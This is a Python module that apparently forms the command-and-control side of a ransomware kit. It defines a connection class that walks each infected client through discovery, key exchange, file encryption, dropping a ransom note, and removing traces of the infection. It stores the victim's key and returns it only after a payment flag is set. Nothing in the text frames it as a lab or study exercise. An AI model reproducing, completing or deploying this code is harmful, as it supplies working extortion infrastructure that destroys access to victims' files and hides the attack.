import websockets
import asyncio 
from enum import Enum
import json

class ConnectionState(Enum):
    CONNECTED = 1 # Connection established with the c2server
    IDENTIFIED = 2 # Envcheck done and username set
    DISCOVERED = 3 # System information found
    CRYPTOGRAPHIC_SETUP = 4 # Cryptographic information prepared and exchanged
    ENCRYPTED = 5 # Files on the system are encrypted
    RANSOMNOTED = 6 # Ransomnote has been dropped on the system
    DECRYPTION_REQUESTED = 7 # Client has requested decryption
    DECRYPTED = 8 # Files have been decrypted
    TRACES_CLEANED = 9 # Any traces of the infection have been removed
    DISCONNECTED = 10 # Connection with the client has been lost.


class Connection:
    def __init__(self, uri, socket: websockets.ServerConnection):
        self.uri = uri
        self.username = None
        self.system_info = None
        self.websocket = socket
        self.state: ConnectionState = ConnectionState.CONNECTED
        self.id = None
        self.__key = None
        self.is_paid = False
        self.__selected_client = None
        self.__files_scanned = 0
        self.__directories_scanned = 0


    def set_username(self, username):
        self.username = username

    def set_system_info(self, info):
        self.system_info = info

    def change_state(self, new_state: ConnectionState):
        self.state = new_state

    def set_id(self, id: str):
        self.id = id

    def set_key(self, key: bytes):
        self.__key = key
        
    def get_key(self) -> bytes:
        return self.__key

    def set_payment_status(self, status: bool):
        self.is_paid = status

    def set_selected_client(self, client:str):
        self.__selected_client = client 

    async def send_message(self, message):
        await self.websocket.send(message)

    async def start(self):
        """Start listening and managing messages from the client."""
        try:
            async for message in self.websocket:
                print(f"\n[{self.username}] {message}")
                data = json.loads(message)
                match data.get("type"):
                    case "discovery_rep":
                        self.change_state(ConnectionState.DISCOVERED)
                        self.__handle_discovery_response(data.get("data", {}))

                    case "crypto_rep":
                        self.change_state(ConnectionState.CRYPTOGRAPHIC_SETUP)
                        self.set_key(data.get("data", {}).get("key", None))
                    
                    case "encryption_rep":
                        self.change_state(ConnectionState.ENCRYPTED)
                        self.__handle_encryption_response(data.get("data", {}))

                    case "ransomnote_rep":
                        self.change_state(ConnectionState.RANSOMNOTED)

                    case "decryption_req":
                        self.change_state(ConnectionState.DECRYPTION_REQUESTED)
                        await self.__send_decryption_rep()

                    case "decryption_res":
                        self.__handle_decryption_response(data.get("data", {}))

                    case "cleaning_rep":
                        self.change_state(ConnectionState.TRACES_CLEANED)
    
                    case _:
                        print(f"[{self.username}] Unknown message type: {data.get('type')}")

                print(f"{self.__generate_cli_text()}", end='', flush=True)

        except websockets.exceptions.ConnectionClosed:
            print("Connection closed by the client.")

    def __generate_cli_text(self) -> str:
        """Generate the CLI prompt text."""
        cli_text = "CLI"
        if self.__selected_client:
            cli_text += f"({self.__selected_client})"
        return cli_text + "> "
    
    def __handle_discovery_response(self, data):
        files_found = data.get("files_found", 0)
        directories_found = data.get("directories", 0)
        self.__files_scanned = files_found
        self.__directories_scanned = directories_found

    def __handle_encryption_response(self, data):
        pass

    async def __send_decryption_rep(self):
        reply = {
            "type": "decryption_rep",
            "data": {
                "status": self.is_paid,
            }
        }
        if self.is_paid:
            reply["data"]["key"] = self.get_key()
        await self.send_message(json.dumps(reply))

    def __handle_decryption_response(self, data):
        result = data.get("result", False)
        if result:
            self.change_state(ConnectionState.DECRYPTED)

    def show_info(self):
        print(f"Connection info:\n- URI: {self.uri}\n- Username: {self.username}\n- State: {self.state.name}\n- Id: {self.id}\n- Paid: {self.is_paid}\n- Key: {self.__key}\n- Files Scanned: {self.__files_scanned}\n- Directories Scanned: {self.__directories_scanned}")